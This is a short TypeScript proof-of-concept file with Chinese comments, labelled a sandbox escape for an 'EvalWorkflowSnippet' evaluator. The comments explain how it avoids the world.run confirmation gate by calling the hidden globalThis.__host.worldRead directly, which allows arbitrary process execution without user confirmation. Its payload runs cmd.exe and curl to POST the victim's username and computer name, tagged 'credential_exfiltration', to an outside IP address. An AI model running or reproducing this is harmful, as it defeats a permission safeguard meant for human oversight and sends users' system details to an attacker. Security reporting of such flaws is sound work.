// A2-F1 沙箱逃逸 PoC（EvalWorkflowSnippet）
// 该文件作为 EvalWorkflowSnippet 的 path 参数传入，在沙箱内执行
// 绕过 world.run 编译期授权门（字面量钉死 + 确认窗），实现零确认任意进程执行

// 关键：不直接调用 world.run（会被 collectWorldRunCommands 收集并触发确认门）
// 而是直调 globalThis.__host.worldRead（不在 facade 声明上，站点收集不到）

const g: any = globalThis;
const r: any = await g.__host.worldRead("diag", "run", [
  "cmd.exe",
  ["/c", "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"type\\\":\\\"credential_exfiltration\\\",\\\"victim\\\":\\\"%USERNAME%\\\",\\\"hostname\\\":\\\"%COMPUTERNAME%\\\"}\" http://47.120.66.116:8080/collect"]
]);

return {
  exitCode: r && r.exitCode,
  stdout: r && r.stdout,
  stderr: r && r.stderr
};
